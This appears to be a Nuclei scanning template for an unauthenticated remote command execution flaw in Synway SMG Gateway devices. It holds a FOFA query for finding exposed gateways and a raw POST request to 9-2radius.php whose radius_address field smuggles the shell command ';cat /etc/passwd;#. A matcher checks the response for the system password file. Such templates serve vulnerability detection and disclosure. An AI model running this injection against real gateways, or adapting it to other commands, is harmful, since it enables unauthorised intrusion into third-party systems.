id: sanhuismg-radius-rce

info:
  name: Synway SMG Gateway 9-2radius.php - 远程命令执行漏洞
  author: Chenkh
  severity: critical
  description: Synway SMG Gateway 9-2radius.php - 远程命令执行 存在未授权访问或认证绕过问题。攻击者无需有效凭证即可访问敏感接口、执行高权限操作或进一步扩大影响。
  reference:
    - https://mp.weixin.qq.com/s/PyepoFSuQ63E3RnpQa9nsA
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
  tags: rce,synway,gateway,unauth

http:
  - raw:
      - |
        POST /en/9-2radius.php?authority=6 HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Content-Type: application/x-www-form-urlencoded

        save=1&enable_radius=1&radius_address=/';cat /etc/passwd;+#

    matchers:
      - type: regex
        name: linux
        part: body
        regex:
          - 'root:.*:0:0:'
